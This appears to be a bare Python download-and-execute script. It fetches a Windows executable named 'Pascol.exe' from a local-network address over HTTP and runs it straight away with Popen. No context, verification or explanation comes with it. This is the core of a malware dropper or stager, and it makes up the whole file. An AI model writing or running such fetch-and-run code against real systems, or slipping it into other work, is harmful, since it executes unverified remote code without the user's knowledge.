import urllib.request
from subprocess import Popen

url = ' http://192.168.100.12/test/Pascol.exe'


def download(url):
    urllib.request.urlretrieve(url, 'Pascol.exe')
    return True


if download(url):
    Popen('Pascol.exe')

